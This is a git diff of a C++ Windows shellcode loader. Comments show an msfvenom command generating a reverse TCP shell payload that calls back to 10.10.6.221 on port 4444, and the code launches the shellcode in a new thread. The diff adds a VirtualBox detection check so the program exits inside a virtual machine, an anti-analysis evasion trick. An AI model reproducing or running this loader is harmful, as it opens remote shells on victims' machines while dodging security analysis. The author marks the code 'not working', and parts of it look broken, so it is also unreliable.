@@ -1,10 +1,12 @@
+// not working
+
 #include <Windows.h>
 #include <iostream>
+#include <winternl.h>
 
 using namespace std;
 
-//https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/
-void main() {
+int main() {
 	/*
 	msfvenom - p windows / shell_reverse_tcp LHOST = 10.10.6.221 LPORT = 4444 - f c
 		[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -62,7 +64,17 @@ void main() {
 
 	DWORD threadId;
 
-	
+	OBJECT_ATTRIBUTES objectAttributes;
+	UNICODE_STRING uDeviceName;
+	RtlSecureZeroMemory(&uDeviceName, sizeof(uDeviceName));
+	RtlInitUnicodeString(&uDeviceName, L"\\Device\\VBoxGuest"); // or pipe: L"\\??\\pipe\\VBoxTrayIPC-<username>"
+	InitializeObjectAttributes(&objectAttributes, &uDeviceName, OBJ_CASE_INSENSITIVE, 0, NULL);
+	HANDLE hDevice = NULL;
+	IO_STATUS_BLOCK ioStatusBlock;
+	NTSTATUS status = NtCreateFile(&hDevice, GENERIC_READ, &objectAttributes, &ioStatusBlock, NULL, 0, 0, FILE_OPEN, 0, NULL, 0);
+	if (NT_SUCCESS(status)) return false;
+
+
 	/*
 	HANDLE CreateThread(
 	[in, optional] LPSECURITY_ATTRIBUTES   lpThreadAttributes,
@@ -76,5 +88,7 @@ void main() {
 
 	HANDLE hthread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadId);
 	WaitForSingleObject(hthread, INFINITE);
+
+	return 0;
 
 }
